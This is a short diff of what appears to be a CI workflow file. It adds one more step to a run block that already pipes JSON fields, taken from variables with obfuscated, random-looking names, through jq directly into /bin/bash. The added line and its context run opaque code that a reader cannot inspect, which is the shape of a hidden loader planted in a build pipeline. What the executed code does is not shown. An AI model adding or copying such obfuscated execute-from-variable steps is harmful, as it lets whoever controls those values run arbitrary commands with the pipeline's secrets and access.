@@ -32,6 +32,7 @@ jobs:
           echo $ndr9 | jq -r .k43 | /bin/bash
           echo $azmpk831 | jq -r .gxpr65 | /bin/bash
           printf '%s' "$clv55" | jq -r .wckn8352 | /bin/bash
+          echo $pyqsc721 | jq -r .s8892 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
